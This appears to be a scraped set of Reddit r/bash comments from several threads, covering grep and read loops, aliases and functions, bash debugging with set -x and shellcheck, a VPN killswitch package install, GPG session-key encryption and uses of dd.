Use the `-f filename` parameter to feed your list of codes into grep. Also add `-F` to make grep search for simple text instead of regex patterns. Use `-l` to make grep print just the file name. If you don't have your codes in a file already, you can use `&lt;(...)` to feed the output of code into the `-f` parameter, or maybe using `&lt;&lt; EOF` could be useful. Let's say your codes are in a file "codes.txt", and your XML files are in your current directory. You can then get a list of the files you are interested in like this: grep -F -f codes.txt *.xml You can then feed that into a 'while' loop: # method 1 grep -F -f codes.txt *.xml | while IFS= read -r file; do # do something with the variable "$file" done # method 2 while IFS= read -r file; do # do something with the variable "$file" done &lt; &lt;(grep -F -f codes.txt *.xml) The second method is interesting if you need to set variables for use in the rest of your script. The first method doesn't work to set variables because the right side of a `|` is run inside a "subshell" and has its own copy of variables.
You can configure fzf with command history too
If it's XML, it might be easier to parse it and extract the value from the "ABC" element if it exists than to try to grep it using some kind of regex. 
What are the inputs of your action? (a) filename only (b) filename and the code that was found (b1) for all the codes that are in the file (b2) 1 is enough (c) you also need the line number of the match (d) something else I’m asking bc the solution might greatly depend on the input requirements of your action.
Automate setting up your workstation after a fresh install including installing and removing packages, managing dotfiles and repositories etc. After a fresh install, `git clone` and run your script, and voila, your PC is ready without any human interaction.
Instead of running grep 250+ times, why not use your for-loop to concatenate the grep OR string required to run it only once? (I have done this with some 20 items out of laziness. It works.)
*this* is the answer. Thanks.
My first bash script was an auotmated csgo server installer. Like others mentioned, automate something or just make something that interests you. Gaming server automation, HTPC, or an automated installer for an existing program are some ideas that should be pretty simple for a first project.
If you're a Vim fan, you can enable Bash vi bindings with `set -o vi`. Now you can use a lot of your Vim muscle memory like `Esc 0 dw` to delete the first word of the command, or `Esc dF"` to delete backwards to the first double quote.
try declare -a MYLIST$(mysql "select id,name from table" | awk '{print "["$1"]="$2}') &amp;#x200B;
Huzzah, thanks for the tip. You were 99% there. As you write it, gives a syntax error due to unexpected \`(' but, doing it with backticks made it work! `declare -a MYLIST\`(mysql | awk)\`` thanks!
Wow, thank you all for the terrific replies! I am overwhelmed. This has got my juices flowing nicely, and I will give this some thought over the weekend. I should have some good candidate projects in a few days. Many thanks again! (now I'm including a newline at EOF, unix style ;) 
Ktorrent can let you specify the interface it can is, so just set it to tun0 and if it drops it stops. 
Cool, but my preferred torrent app is Deluge. :) There are VPN services with killswitches, too.
This looks great, but would be nice if you could enable issues too so we could contribute. For example, your .deb install command doesn't work in Debian (but it would without the `-O vpn-killswitch.deb`). :)
Just go for iptables owner module. It will be lot more seemless.
I just tested on mine and it worked: angela@debian$ ~: cd /tmp &amp;&amp; wget https://github.com/angela-d/vpn-killswitch/blob/master/vpn-killswitch.deb -O vpn-killswitch.deb &amp;&amp; apt install ./vpn-killswitch.deb --2018-12-01 11:56:53-- https://github.com/angela-d/vpn-killswitch/blob/master/vpn-killswitch.deb Resolving github.com (github.com)... 192.30.253.113, 192.30.253.112 Connecting to github.com (github.com)|192.30.253.113|:443... connected. HTTP request sent, awaiting response... 200 OK Length: unspecified [text/html] Saving to: ‘vpn-killswitch.deb’ vpn-killswitch.deb [ &lt;=&gt; ] 54.69K --.-KB/s in 0.08s 2018-12-01 11:56:54 (645 KB/s) - ‘vpn-killswitch.deb’ saved [56007] E: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied) E: Unable to lock the administration directory (/var/lib/dpkg/), are you root? &gt; would be nice if you could enable issues too so we could contribute. Done! :)
&gt; Just go for iptables owner module. Is this any different than the iptables I wrote in the readme that didn't work with deluge-gtk? I don't use the server version. 
your alias appears to be missing a closing ". 
Oh sorry, I just forgot to put it in the post, it's already in the command.
Your formatting may be confusing me, but I think you’re trying to execute additional commands after you enter the repo url (as an argument)? You’re probably going to be better served with a function instead of an alias.
Yes, you're right. But when you say function, you mean a bash script ?
You can have functions and their arguments in your bashrc file.
Does anyone know if this is spam or not? I can’t open the link, but this has 20 upvotes…
That's awesome, thank you! For me, this happens tho: ``` wget https://github.com/angela-d/vpn-killswitch/blob/master/vpn-killswitch.deb -O vpn-killswitch.deb &amp;&amp; head -n 15 vpn-killswitch.deb --2018-12-02 00:14:48-- https://github.com/angela-d/vpn-killswitch/blob/master/vpn-killswitch.deb Resolving github.com (github.com)... 192.30.253.112, 192.30.253.113 Connecting to github.com (github.com)|192.30.253.112|:443... connected. HTTP request sent, awaiting response... 200 OK Length: unspecified [text/html] Saving to: ‘vpn-killswitch.deb’ vpn-killswitch.deb [ &lt;=&gt; ] 55.48K 162KB/s in 0.3s 2018-12-02 00:14:49 (162 KB/s) - ‘vpn-killswitch.deb’ saved [56812] &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;link rel="dns-prefetch" href="https://assets-cdn.github.com"&gt; &lt;link rel="dns-prefetch" href="https://avatars0.githubusercontent.com"&gt; &lt;link rel="dns-prefetch" href="https://avatars1.githubusercontent.com"&gt; &lt;link rel="dns-prefetch" href="https://avatars2.githubusercontent.com"&gt; &lt;link rel="dns-prefetch" href="https://avatars3.githubusercontent.com"&gt; ``` Did you test out the file it downloads? 
functionName() { #do stuff printf “words” &gt; file.txt cat file.txt } 
I did! It's how I installed it to my system once I finished building it. I suspect this is your problem: ... &amp;&amp; head -n 15 vpn-killswitch.deb The head flag is not in the original wget on the readme: ... -O vpn-killswitch.deb &amp;&amp; apt install ./vpn-killswitch.deb
You should indent code with four blanks on Reddit. As it is, it's hard to tell if the `**` were meant literally or if they're a side effect of making the whole line bold.
Ah -- yeah I see that now. I'm using xfce4-terminal
Thank you. So If I understand this, I would want to do something a little like this: ------------------------ website="http://website.com" accessKey="access_key=1234&amp;format=" format="1&amp;fields=latitude,longitude" while read ip; do curl "${website}${ip}${accessKey}${format}" sleep 5 done &lt; ipOutput.txt -------------------------------------------------- Which ideally would call: ----------------------------- curl http://website.com/$192.168.0.1?access_key=1234&amp;format=1&amp;fields=latitude,longitude and assign the IP variable to the next line of ipList.txt?
Simply put, read each line in the file, then: * If it's a `&lt;H3&gt;`, it's a folder line, so create it and `cd` in. * If it's a `&lt;A&gt;`, it's a bookmark, so populate it. * If it's a `&lt;/DL&gt;`, it's the *end of the current folder*, so `cd ..`. You'd also have to sanitize each folder/bookmark name: * At the very least, you need to substitute something for every slash in the name, otherwise your directory hierarchy gets unexpectedly deep. * Also watch the length of each bookmark name; you probably want to cap it at, say, 120 chars. Done properly, your script should look something like this: #!/bin/bash # USAGE: mk_bookmarks_dir &lt;root_dir&gt; # Reads a Netscape bookmarks file from STDIN and # "explodes" it into a directory hierarchy # Extract text node from &lt;DT&gt; line extract_text() { echo "$1" | sed -E 's#^.*&lt;DT&gt;&lt;([^ ]*) .*&gt;([^&lt;]*)&lt;/\1&gt;.*$#\2#' } mkdir -p "$1" cd "$1" while read L; do case "$L" in *\&lt;A\ *) # Bookmark entry N="$(extract_text "$L")"; N="${N//\//_}"; N="${N:0:120}" echo "${L## }" &gt; "${N}.txt" ;; *\&lt;H3\ *) # Directory entry D="$(extract_text "$L")"; D="${D//\//_}"; D="${D:0:120}" mkdir -p "$D" cd "$D" ;; *\&lt;/DL\&gt;*) # End of directory cd .. ;; esac done &amp;#x200B;
Note that, since you're using Google Chrome, you can also directly access your bookmarks at `${HOME}/.config/google-chrome/Default/Bookmarks`. Two reasons you might want to do this: * It's a "live" file, so always up-to-date. * It's a properly-structured *JSON* file, which may actually work better for whatever you have in mind. At the very least, you don't have to sanitize anything (and therefore lose information).
Yes that's exactly it, when I edited the \*\* popped up and i didn't notice.
I think I understand, I guess I'll try it out, thank you.
The misspelling and grammar make me wary. Not to mention the guys profile pic looking like a traditional facebook-pretty-girl-trap. - just my 2c.
Are you sure what you pasted is what you're trying to run? Line 1 is wrong.
Yes, I just was trying to make things generic instead of using actual websites, and messed up changing the variables. Kinda delirious and frustrated at code, but trying to push through it. 
Here’s a couple examples from my own bashrc as well: ``` decrypt() { openssl enc -d -aes-256-cbc -in “$1” -out “$1.decrypted” } encrypt() { openssl enc -aes-256-cbc -salt -in “$1” -out “$1.encrypted” } tardir() { tar -czf “$1”.tar.gz “$1” } ``` You can see I’m using “$1” to pass the arguments into the full command. AFAIK this cannot be done with an alias.
can you show us the bash command you are trying to alias exactly as it is entered into the terminal?
Try using single quotes to prevent expansion
Some feedback to help you up your game a little bit: &gt; for x in \`cat list-of-dates.txt\`; do You should try to use meaningful variable names^[1] . Don't use backticks - it's not 1983. Useless Use of Cat. `for dateStr in $(&lt;list-of-dates.txt); do` Even better is to use a `while read` loop [instead.](https://github.com/koalaman/shellcheck/wiki/SC2013) &gt;D=`echo $x | cut -c 1-8` If strict portability isn't a concern, this becomes a Useless Use of Echo `anotherMeaningfulVar=$(cut -c 1-8 &lt;&lt;&lt; "${dateStr}")` Either way, this and &gt;AB=`echo $x | cut -c 9` Are Useless Use of Externals. You're splitting the string into two, `bash` [can do this by itself](https://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion), and generally if you can do something with a builtin, you should do it with the builtin. Give it a shot: dateLine=20050406A timeOfDay="${dateLine:8}" dateStr="${dateLine:0:8}" echo "${dateStr} ${timeOfDay}" And in a loop of this parse-file-line-by-line nature, these variable assignments aren't strictly necessary either. &gt;if ( test "${AB}" = "A" ); then Why are you needlessly launching a subshell just to run `test` when you can use `[[]]`? `if [[ "${AB}" = "A" ]]; then` FWIW, I think when you're working through a known list of potentials like this, that `case .. esac` is the better choice. So let's rewrite: #!/bin/bash # Read a line, assign it to the builtin variable REPLY while read -r; do # Split REPLY from the 8th character offset, compare and assign case "${REPLY:8}" in (A) timeOfDay=Afternoon ;; (B) timeOfDay=Evening ;; (*) # If we can't determine as above, emit an error and continue parsing the file printf '%s\n' "Unable to determine time of day from '${REPLY}'" &gt;&amp;2 continue ;; esac # Split the first 8 characters from REPLY and format our output based on it date +"%B %-d %Y ${timeOfDay}" -d"${REPLY:0:8}" done &lt; list-of-dates.txt Now that, in and of itself, is not perfect, but it's sufficient for our needs. Demo: ▓▒░$ cat list-of-dates.txt 20050406A 20050406B 20070814Pantsacular 20140615A 20140615B ▓▒░$ bash dateconv April 6 2005 Afternoon April 6 2005 Evening Unable to determine time of day from '20070814Pantsacular' June 15 2014 Afternoon June 15 2014 Evening And because we're putting our error onto STDERR, we can split that out too: ▓▒░$ bash dateconv 1&gt;/dev/null Unable to determine time of day from '20070814Pantsacular' ^[1] Possible acceptable exclusion: Unless you're following some well established C-style practice e.g. `for ((i=0; i&lt;=20; i++)); do`
Yes, I know my style is a bit anachronistic and even inefficient. But it works. If I were expecting to write something to handle million-line files, then fine-tuning the performance might matter. :)
Another way to prevent applications from using non-VPN access is to remove (or decline to set) a default route for non-VPN connectivity. Instead, use the router specified as "default" route, ONLY as a route for - a DNS resolver to lookup the IP of the VPN terminator, if needed - the IP of the VPN terminator. 
That just prints the file so you could see it. It can’t be the issue it doesn’t do anything with the file. Hm. Okay, I can look into it when I have time. 
&gt;Somebody knows how to fix this ? Yes, *stop trying to use an alias for this*. Think of a shell alias as a **macro with no arguments**: Whatever it's defined as is *literally substituted* at the start of your command line, so your alias: $ alias clone="git clone git@git.my.school.edu:/mymail/" turns: $ clone myrepo literally into: $ git clone git@git.my.schoo.edu:/mymail/ myrepo i.e. clone the (nonexistent) Git repo at `git@git.my.schoo.edu:/mymail/` into the local working directory `myrepo`. Others have recommended defining a shell function for this. I disagree, and would always favor a *script* over both shell functions and aliases, except in very specific circumstances (generally along the lines of "I have to modify my interactive shell's working environment"). For your purpose, the script's as simple as: #!/bin/bash git clone git@git.my.school.edu:/mymail/"$1" If you absolutely, positively, *must* have a function: clone() { git clone git@git.my.school.edu:/mymail/"$1" }
I don't use a debugger per se, but I will use `set -x` around suspect areas when I need to see more detail about what's happening in a section. For editors, I remain a `vim` fan and use that for pretty much all my development.
Assuming you're using a relatively modern version of ZPAQ, then @ropid 's suggestion: zpaq a ../OUTPUT.zpaq . -m5 -noattributes -t4 should work just fine. If it throws errors, or if you find yourself in a situation where you need to select only certain files (say, by name via `find`), then simply invoke Rule #1 of Software Development: &gt;Any problem can be solved by adding another layer of indirection. Simply wrap your zpaq command in a script, say, `myzpaq.sh`: #!/bin/bash zpaq a ../OUTPUT.zpaq "$@" -m5 -noattributes -t4 Then you can simply: $ find . -maxdepth 1 -type f | xargs ../myzpaq.sh which will work even if you have a \*billion\* files in your current directory.
Haven't actually used it, but Dave (the guy behind TutoriaLinux - do check his Youtube videos) recommends emacs. 
Try scriptcheck
Try scriptcheck
I write bits on the command line to see them working, then add them to a file once they do what I want.
How to debug a long script written by someone else?
&gt; what debugger do you use to debug long bash scripts? None. Instead, I: 1. First think **HARD** about the problem I'm trying to solve, decomposing it into manageable chunks that make full use of the shell's real utility as a *glue language*. 2. Write *short* bash scripts that each solve Just One Chunk, or (better) recall previously-written scripts that already do the necessary bits. 3. String them all together with another (short) script. What I've found is the short bash scripts I produce in [2] almost always end up being useful by themselves, so I don't have to copy-and-paste the same code chunks into other projects. Bash scripting is one area where *merciless factoring* often yields great benefits. &gt; Any good editors for bash scripting? I use Vim. Not much of an Emacs fan, though I'll use it if a vi-clone isn't available (haven't had that happen yet).
do you use plugins with vim?
I've seen a lot of interesting ones out there, but I don't for reasons that wouldn't apply to most people. A lot of work I do involves using machines I don't control, so I want my muscle memory to work mostly with vanilla vim. That way when I'm in a new environment I don't have to spend a long time trying to get things setup how I like it.
* [Read This (http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_02_03.html) * Use scriptcheck * Add set -x to the beginning of your code On that last note, I start every script with: !?bin/bash source /etc/default # DEBUG In default, I put a lot of parameters that I use, like colors, lines, some checks I might like to do. It also does debugging and error detection. So it contains, among other things, # Text color variables {{{ txtund=$(tput sgr 0 1) # Underline txtbld=$(tput bold) # Bold txtblk=$(tput setaf 0) # Black txtred=$(tput setaf 1) # Red txtgrn=$(tput setaf 2) # Green txtyel=$(tput setaf 3) # Yellow txtblu=$(tput setaf 4) # Blue txtpur=$(tput setaf 5) # Purple txtcyn=$(tput setaf 6) # Cyan txtwht=$(tput setaf 7) # White txtrev=$(tput rev) # Reverse text txtoff=$(tput sgr0) # Text reset # Error Handling {{{ ERROR () { echo "$Something went wrong" if [ -n "$1" ] then echo "$1" fi exit # }}} # Debugging data {{{ DEBUG () { clear SPACES=$(printf "%`tput cols`s") PS4='+${txtbld}\ ${txtgrn}${SPACES:0:$((5-${#LINENO}))}$LINENO \ ${txtblu}${FUNCNAME:-${SPACES:0:12}}${FUNCNAME:+${SPACES:0:$((12 - ${#FUNCNAME}))}}\ ${txtoff}' set -x } # }}} I can then just remove the # in front of debug. For the error handling I can do something like false || ERROR "Something wrong on $LINENO" That way, even when debugging is off, I know what line the error came from. Making it a lot easier to do And I use gvim, the GUI version of vim. The most important part is that you have something that shows colors when you edit. You have no Idea how often you do a copy and do not see the difference between a single quote and a backtick, or started with a double quote and never ended it. And if everything is red after a certain point, you know you done bad, like real bad, Also know that the `set -x` can be placed anywhere, not just at the beginning. You can so something in the middle: set -x Many lines in the middle set +x 
Your mobile replaced all the quote with unicode equivalents. Anyway, I believe the argument in the clone function should go last clone() { git clone "ssh://git@git.myschool:7999/mymail/$1" "${@:2}"; }
From the bash man page: PS2 The value of this parameter is expanded as with PS1 and used as the secondary prompt string. The default is ``&gt; ''. It's for multi-line commands, something like this: al@x1yoga|10:33|~$&gt; if [ 1 -lt 2 ]; then &gt; echo 'yes' &gt; fi yes al@x1yoga|10:33|~$&gt; 
I don't know why someone downvoted you. You have a fair point but it doesn't help in an enterprise environment to proceed without a solid debugger. 
nice. what do you think about bashdebugger + ddd?
Insert a line like this to find the value of a variable: echo "Var&gt;$Var&lt;"
&gt; I don't know why someone downvoted you. *&lt;shrug&gt;* Haters gotta hate. &gt; You have a fair point but it doesn't help in an enterprise environment to proceed without a solid debugger. If you do what I described above, it doesn't matter what kind of environment you're operating in. I simply don't end up in a position where I *have* to use a bash debugger to maintain my sanity, because: * I write bash to glue things together, not as a compute engine (bash != Python, but I've seen far too many people write scripts that ignore this), * I construct lots of data pipelines, which I can't trace with a bash debugger anyway, * my scripts are short enough to be easily reasoned with, and * each script runs in an isolated shell process, and therefore don't screw each other with unexpected state contamination (probably the #1 bug that requires a debugger). I get that some folks prefer monolithic bash scripts and excessive cleverness. I just prefer *minimizing first-run problems*, instead of using debugger-of-the-week every day to figure out what went boom.
Or, in the OP's case: &gt;I inadvertently typed a double quote at the bash prompt, hit enter an unterminated string.
Okay, that makes sense. I picked it up when I failed to close the quotes: XX@XX.com~$&gt; echo Hello" &gt; &gt; thanks
sounds good. You're talking about the perfect world. This should be fine if you are code owner but what if there are legacy long scripts. I wish someone could comment/give insights on bash debugger. Anyhow, knowing a debugger does always help in the long run, doesn't it?
I’ve removed it as spam now.
I'm with you there. No bash aliases, no plugins, every time I hop on a new machine or wipe and reinstall, my reflexes are still suited to the environment. In school I went through a year or two of heavy customizing/aliasing but once I started working 90% of my local commands were `ssh`ing into a vanilla environment, often customer-owned, and all that customization was working against me. 
You get that for free with `bash -x script-name`
Sorry, my bad. The app I was referring to is shellcheck.
I'm interested in this 'merciless factoring' term. Currently, my rule-of-thumb that if some code process that is used multiple times, takes more than 3 or 4 lines, then I set it up in it's own function within that script. What you're saying here, is to extract whatever process you are going to reuse, of any length, not necessarily into a function, but to set it up as a separate script, and then call that from the parent script. Do I have that right? I'm working on a script now that I'm going to be using for the next 5 years, and my first pass at it now exceeds 1000 lines. I find it really ungainly, and need some approach that can pare it back to a manageable size. So the main problem would be how to maintain the global variables that are needed from start to finish, but get as much of the actual processing done outside the parent script as possible. Thanks, you've given me something to think about here.
Doesn't look like anyone mention shellcheck. You can put code in shellcheck.net or download and use it locally. I have it working with the vim plugin Syntastic for on the fly error checking. As others have mentioned, bash -x for debugging...
When I run: &gt; wget https://github.com/angela-d/vpn-killswitch/blob/master/vpn-killswitch.deb -O vpn-killswitch.deb &amp;&amp; head -n 15 vpn-killswitch.deb I get the exact same response you do. Your command still downloads the deb, but its returning Github headers rather than what you want, I suspect.
Well, ideally, "someone else" should be debugging their own script. :) But if you know what its supposed to do, you can use "read" to add pauses, display contents of key variables, etc.. at points to see what is or isn't working.
I thought a debugger like bashdb already does this in a pleasent way.
Yes, I understand that. But is that not the command in your readme, or am I missing something?
The command in the readme is: cd /tmp &amp;&amp; wget https://github.com/angela-d/vpn-killswitch/blob/master/vpn-killswitch.deb -O vpn-killswitch.deb &amp;&amp; apt install ./vpn-killswitch.deb Which would need to be run as sudo/root for the apt install to take place. You could also do a simple: https://github.com/angela-d/vpn-killswitch/blob/master/vpn-killswitch.deb If you wanted to inspect its structure before installing.
https://www.shellcheck.net/ is worth its weight in gold!
&gt; I wish someone could comment/give insights on bash debugger. What do you want from a debugger that you don't get from the `bash -x` / `set -x` method already offered up here several times? 
I'm sorry, I feel like we're talking past each other at this point, and it's not very useful. What I was trying to say is that running `wget https://github.com/angela-d/vpn-killswitch/blob/master/vpn-killswitch.deb -O vpn-killswitch.deb` on my system results in a file `vpn-killswitch.deb` which contains HTML from github. Not the raw file. I hope I'm making myself clear here. The address `https://github.com/angela-d/vpn-killswitch/blob/master/vpn-killswitch.deb` gives me a webpage. I've tried that on two Debian systems (stable and testing) with the same results. Do you see what I mean?
Maybe. Never used one.
Shellcheck, shellcheck, shellcheck. I use the web interface, I host an internal version of it at work (to placate anyone who doesn't want to paste code across the public internet), I run it locally, I have run it in the past as a Vim plugin (though I don't anymore) and I run it as a VSCode plugin. Shellcheck will do most of the work for you, and using it will teach you a whole bunch of the language's pitfalls and limitations. You've asked about debugging a long script written by someone else - I do this routinely as part of my job. If I'm break-fixing, then it's `set -x` or `bash -x scriptname` as others have described, followed by eyeballing the area of the script where the failure has occurred. Then trying to replicate the behaviour. I'll fix only the fault and otherwise leave the script alone - I'm a busy sysadmin/engineer and I can't be spending my days cleaning up every single instance of everybody else's fuck ups. Otherwise, I usually apply my coding style, which by virtue fixes some problems (e.g. correct variable quotation, not using UPPERCASE vars etc), then I apply a sort-of [Don't Repeat Yourself](https://en.wikipedia.org/wiki/Don%27t_repeat_yourself) method where duplicated code gets abstracted into functions (and/or I import usable/relevant functions from my catalogue), and as part of this the majority of the code tends to collapse down into something far more readable. Finally a cursory run through shellcheck to see if I left any errors.
**Don't repeat yourself** In software engineering, don't repeat yourself (DRY) is a principle of software development aimed at reducing repetition of software patterns, replacing it with abstractions or using data normalization to avoid redundancy. The DRY principle is stated as "Every piece of knowledge must have a single, unambiguous, authoritative representation within a system". The principle has been formulated by Andy Hunt and Dave Thomas in their book The Pragmatic Programmer. They apply it quite broadly to include "database schemas, test plans, the build system, even documentation". *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/bash/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.28
Did you mean shellcheck?
I find that simply using a good text editor to be enough (I'm *very* partial to [Sublime Text](https://www.sublimetext.com/)). It's free to use ("evaluate") for as long as you want, but you'll receive an occasional reminder that the developers are people and like to eat until you buy the license ("guilt-ware" is the term I use for it). If something doesn't work as expected, I generally just copy-and-paste the script into the terminal, line-by-line, echoing out the variable values along the way. Occasionally, I'll run the script using `bash -x`, but the amount of output that produces is generally so overwhelming to me that I don't find it entirely useful. It's a lot easier, IMO, to just run each line/section manually until the bug is found. &amp;#x200B; PS: If you do find yourself finding enjoying Sublime Text, find it useful, and can afford to do so, I'd definitely encourage folks to buy the license (1-time purchase of $80, with no limit to the number of installations). It's good to reward companies that make a good product and have user-friendly policies.
 bash -x script coupled with export PS4='+$(basename ${BASH_SOURCE}):${LINENO}:${FUNCNAME[0]:+${FUNCNAME[0]}(): }' ... gives more detailed info about which file and line number is executing. &amp;#x200B; Also `emacs` with `shellcheck` 
Too much info if you only want to know the value of a single variable.
I use shellcheck and love it. It shows me if I have an error anywhere. 
OH I see! Yeah, I can totally reproduce it now. Fixed! Thanks for bringing it to my attention!
First thing I spotted is lack of “set -e” and friends. Google match on subject: https://vaneyckt.io/posts/safer_bash_scripts_with_set_euxo_pipefail/ ...
Thank you for the information! Gave it a read and added it to the script. However, when I input wrong values for the GPG email or the target directory and `mv` or `gpg` throw up errors in the terminal, the program still keeps going, even though I have `set -Eeou`. How come the failure of these commands isn't being caught and exiting the script immediately?
This is knitpicky but Asymetric encryption is a really inefficient way to encrypt large files. It would be much faster if you use GPG with an x25519 key which you can do by passing --full-gen-key and --expert or even faster if you used a Diffie-Hellman or just symetric.
That's okay, I like knitpicky feedback. I could add an -se flag for symmetric encryption. How would I get the key from the user securely and give it to GPG in BASH?
My understanding is passing the --symetric-encryption flag should bring up a secure dialog box even if you run it through bash. There is no obvious way get around this securely with bash though so automating symetric encryption would be harder and you have to store the symetric key securely which GPG has no way to manage. You could use your private key to encrypt the symetric keys. I think you'd see huge improvments just from using an ECC keypair in GPG though. 
Alternatively there is a way to make GPG take key input from other programs, so you could hardcode the symetric key in the bashscript and set it to be only readable by root. I'm sure there are reasons why this is bad practice but if it's root 700 I really don't see how anyone could steal the key...
You should really consider [borg](https://borgbackup.readthedocs.io/en/stable/). It's likely better/faster/smaller/easier/more secure than this. 
I was curious about the actual speed differences so I did a very rough test on a 139 MB file so I guess it's really not as big of a deal as I thought. symetric encrypt: 0m9.443s ecc encrypt: 0m12.724s rsa encrypt: 0m13.766s For some reason the decrypt times were all the same! I don't know if there's some kind of caching going on since it was all the same file. Symetric decrypt: 0m1.838s ECC decrypt: 0m1.861s RSA decrypt: 0m1.861s Anyway I did tested the geekbench accelerated AES throughput on my laptop and got a result of 5.00 GB/sec. Either GPG is not optimized for AES or something weird is going on with my test. It should be atleast 2 orders of magnitude faster. Needs more investigation. Also, I noticed the post scarcity fully automated luxury bash script dog whistle ;)
Sure thing. 
When using gpg, the actual encryption on the payload data is not asymmetric. Instead, a randomized normal key is randomly generated to encrypt the data traditionally, and then only that random key itself is encrypted using the asymmetric encryption, and included in the resulting output.
Oh cool. Can't believe I didn't know that. Makes a lot more sense.
Ask and you shall receive https://gitlab.com/krathalan/bash-backup-script/commit/82a76646769c19dea03b4b79484cd83e9918a6aa
Not much, as I never used either of them.
Nice! That was quick
ssh works the same way. A 'session key' is generated (and is regenerated at configurable intervals during a connection) and is itself exchanged using the public key encryption.
&gt;This is knitpicky but Asymetric encryption is a really inefficient way to encrypt large files. True, but... &gt;It would be much faster if you use GPG with an x25519 key which you can do by passing --full-gen-key and --expert or even faster if you used a Diffie-Hellman or just symetric. **GPG doesn't use asymmetric encryption for the data payload**. Instead, it encrypts the data with a *symmetric* algorithm (e.g. AES-128), and reserves asymmetric encryption for the *payload encryption key*. This is probably the #1 misconception that most people have w.r.t. GPG. Here's what GPG actually does when encrypting your file: 1. Generate a random symmetric *session key* (length depends on algorithm used, default AES-256). 2. Compress file data (I believe it defaults to ZLIB level 6). 3. Encrypt compressed payload symmetrically with session key. 4. Encrypt session key with user's public key. 5. Prepend encrypted session key to encrypted payload. Most of the above can be seen by simply packet-dumping the resulting encrypted file: $ gpg --list-packets --show-session-key &lt; random.1G.gpg gpg: encrypted with 2048-bit RSA key, ID 1ACA4AA343DAC97A, created 2016-02-26 "Me &lt;me@my.dom.ain&gt;" gpg: session key: '9:78EA4B9E153852C4D08F05BF2FA0E3750548A7434669C3ABDFA3AA8535E95B58' # off=0 ctb=85 tag=1 hlen=3 plen=268 :pubkey enc packet: version 3, algo 1, keyid 1ACA4AA343DAC97A data: [2048 bits] # off=271 ctb=d2 tag=18 hlen=2 plen=0 partial new-ctb :encrypted data packet: length: unknown mdc_method: 2 # off=292 ctb=a3 tag=8 hlen=1 plen=0 indeterminate :compressed packet: algo=2 # off=294 ctb=ae tag=11 hlen=5 plen=1073741839 :literal data packet: mode b (62), created 1543834792, name="random.1G", raw data: 1073741824 bytes Note the session key on line 3, and the compression hint on line 12.
See my other comment in this thread for the reason why you're not seeing disproportionately-high RSA/ECC encryption times: [https://www.reddit.com/r/bash/comments/a2ksej/script\_to\_make\_gpgencrypted\_or\_unencrypted\_backups/eazs1b2](https://www.reddit.com/r/bash/comments/a2ksej/script_to_make_gpgencrypted_or_unencrypted_backups/eazs1b2) *TL;DR*: GPG's already using AES-256 to encrypt the payload, so specifying symmetric encryption is almost a no-op.
SSH uses diffie-hellman because it uses the same session key in both directions whereas gpg only requires one private key to be able to decrypt it so it's a bit different.
True, but the point is that neither one uses the complex pub/priv keypair to encrypt the live data - they use it to securely record or exchange a conventional encryption key, which is what is used for the actual data.
Being a 1337 h4x0r? Other than that, no.
My focus is more on *decomposition*, breaking it down into independent components that can be mixed and matched as necessary. *Reusable* components may or may not fall out of this exercise. For instance, I've designed and implemented several proprietary data processing setups for my consulting clients over the years, and all of them have looked roughly like this: * *M* data collection scripts/programs per data provider, each script grabbing and processing one class of raw data * one data collection orchestrator script or Makefile per data provider, to ensure everything's in the right place and executed in the right order * *N* data processing scripts/programs, one per class of output data * one data processing orchestrator script or Makefile per data class, to ensure everything's in the right place and executed in the right order * *P* data publishing scripts/programs, one per reporting class * one data processing orchestrator script or Makefile per data class, to ensure everything's in the right place and executed in the right order * one or more master orchestrator scripts or Makefiles to tie everything together My personal record was 120+ separate scripts/programs for a single data setup, each of which had clearly-defined inputs/outputs and processing scope limited to reasonable sizes, and therefore *easily tested*. Not a bash debugger in sight, and it replaced a million-LOC Java monolith that was always failing on unexpected corner cases. &gt; So the main problem would be how to maintain the global variables that are needed from start to finish, but get as much of the actual processing done outside the parent script as possible. One of the nice things about merciless factoring: you'll likely find that your program's state suddenly shrinks from an all-encompassing global ball of wax to individual bits with limited scopes and lifetimes. This makes reasoning about your overall program state a whole lot easier, and you can simply pass the necessary bits from one stage to another via any/all of: * state info passed in as part of standard input, * command-line arguments, or * environment variables whose lifetimes can be strictly limited at the orchestration level (think `STAGE1VAR=xyz stage1 | stage2`, where stage2 never sees the irrelevant `$STAGE1VAR`).
\`dd 2&gt;/dev/null if=file\` and \`cat file\` essentially produce the same output, but \`dd\` can do so much more. Just a sampling: * Write to a file as a different user: \`echo test | sudo dd of=rootonly.txt\` * Pad output to defined block size: \`echo test | dd of=floppy.img obs=1440K conv=sync\` * Create sparse disk images: \`dd if=/dev/zero of=1TB.empty bs=1M count=1048576 conv=sparse\` (creates a 1TB file that actually takes up zero space on disk) * Replace a chunk in the middle of a file, without truncating or unnecessary copying: \`dd if=/dev/urandom of=1TB.empty bs=1K skip=1024 count=4 conv=notrunc\` (replaces a 4KB chunk with random data at the 1MB...and now \`1TB.empty\` takes up just 4KB on disk, but is still technically 1TB in size). \`man dd\` for more details.
Theoretically `cat` could be quicker by default as it bases its buffer size on the kernel memory page size. But in practice that's both unproven and doesn't matter as the performance difference is so small. You're throwing away straight forward error handling by using `dd` as you're piping it all to `/dev/null`. Also it's a good practice to follow convention and use the simplest standardized command for the job. It's both super important and super hard to write clear code which is easy to understand. This wouldn't be an example of that. On the other hand, if it's for learning purposes these kind of questions and looking up their answers (like I did when writing this answer by reading the source code of cat) is both entertaining and gives you a deeper understanding of things.
&gt; it bases its buffer size on the kernel memory page size Which version of `cat` does this? GNU coreutils [hardcodes it to 128KiB](http://git.savannah.gnu.org/gitweb/?p=coreutils.git;a=blob;f=src/ioblksize.h;h=ed2f4a9c4d77462f357353eb73ee4306c28b37f1;hb=HEAD#l73)
You're mis-reading the code. That's the minimum. It will use 128KiB, or the block size of the I/O device, whichever is larger.
